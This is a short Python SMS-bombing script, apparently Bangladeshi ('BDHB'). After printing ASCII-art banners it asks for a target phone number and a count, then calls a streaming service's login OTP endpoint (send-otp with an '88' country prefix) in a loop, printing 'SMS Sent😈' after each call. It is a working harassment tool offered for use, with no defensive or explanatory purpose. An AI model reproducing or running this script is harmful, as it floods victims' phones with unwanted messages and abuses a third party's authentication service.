# -*- coding: utf-8 -*-
import time,sys
logo= '''


██████╗ ██████╗ ██╗  ██╗██████╗ 
██╔══██╗██╔══██╗██║  ██║██╔══██╗
██████╔╝██║  ██║███████║██████╔╝
██╔══██╗██║  ██║██╔══██║██╔══██╗
██████╔╝██████╔╝██║  ██║██████╔╝
╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                


'''
def logop(z):
    for word in z + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.03)
logop(logo)

logo='''


  ____     _____      _       ____      _____   
 / __"| u |_ " _| U  /"\  uU |  _"\ u  |_ " _|  
<\___ \/    | |    \/ _ \/  \| |_) |/    | |    
 u___) |   /| |\   / ___ \   |  _ <     /| |\   
 |____/>> u |_|U  /_/   \_\  |_| \_\   u |_|U   
  )(  (__)_// \\_  \\    >>  //   \\_  _// \\_  
 (__)    (__) (__)(__)  (__)(__)  (__)(__) (__) 

'''
print(logo)

import requests

number=str(input(" Enter The Number👉 : "))

amount=int(input(" Enter The Amount👉 : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
	
	requests.get(api)
	
	print(str(i+1)+" ☑️BDHB SMS Sent😈")
